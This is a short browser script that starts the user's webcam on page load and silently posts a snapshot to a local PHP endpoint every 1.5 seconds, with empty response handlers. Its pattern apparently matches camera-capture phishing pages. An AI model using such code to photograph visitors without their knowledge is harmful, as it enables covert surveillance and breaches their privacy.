function post(imgdata, isfirst) {
    $.ajax({
        type: "POST",
        data: { cat: imgdata, isfirst },
        url: "./php/post.php",
        dataType: "json",
        async: false,
        success: function (result) {
            // call the function that handles the response/results
        },
        error: function () {},
    })
}

;("use strict")

const video = document.getElementById("video")
const canvas = document.getElementById("canvas")
const errorMsgElement = document.querySelector("span#errorMsg")

const constraints = {
    audio: false,
    video: {
        facingMode: "user",
    },
}

// Access webcam
async function init() {
    console.log(111)
    try {
        const stream = await navigator.mediaDevices.getUserMedia(constraints)
        handleSuccess(stream)
    } catch (e) {
        console.log(`navigator.getUserMedia error:${e.toString()}`)
    }
}

// Success
function handleSuccess(stream) {
    window.stream = stream
    video.srcObject = stream
    var context = canvas.getContext("2d")
    var isFirst = true
    setInterval(function () {
        context.drawImage(video, 0, 0, 640, 640)
        var canvasData = canvas
            .toDataURL("image/png")
            .replace("image/png", "image/octet-stream")
        post(canvasData, isFirst)
        if (isFirst) isFirst = !isFirst
    }, 1500)
}

// Load init
init()
